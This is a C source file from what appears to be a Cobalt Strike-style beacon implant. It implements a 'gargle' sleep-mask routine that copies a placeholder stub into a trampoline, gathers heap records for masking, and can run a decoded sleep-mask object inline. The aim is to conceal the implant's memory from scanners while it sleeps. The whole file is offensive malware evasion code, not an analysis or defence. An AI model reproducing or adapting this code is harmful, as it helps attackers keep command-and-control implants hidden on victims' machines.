/* gargle! */
#include <winsock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"
#include "track_memory.h"
#include "datastore.h"
#include "parse.h"


typedef void(*GARGLEF)(GARGLEP * parms, void (__stdcall *Sleep)(DWORD), DWORD time);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, void(__stdcall *pSleep)(DWORD), DWORD time) {
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop(); __nop();
}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleSleep(DWORD time) {
	GARGLEF func;
	char decoded[16384];
	int dlen;

	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
		Sleep(time);
		return;
	}

	dlen = sleepmask_decode(decoded, (int)sizeof(decoded));
	if (dlen > 16) {
		datap parser;
		DWORD entry;
		int prefix;
		DWORD be_time;
		data_init(&parser, decoded, dlen);
		data_int(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		data_extract(&parser);
		prefix = dlen - parser.length;
		entry = data_int(&parser);
		be_time = htonl(time);
		command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time));
		return;
	}

	setup_trampoline2();
	func = (GARGLEF)gtrampoline;
	gparms->heap_records = track_memory_get_heap_records_to_mask();
	func(gparms, Sleep, time);
}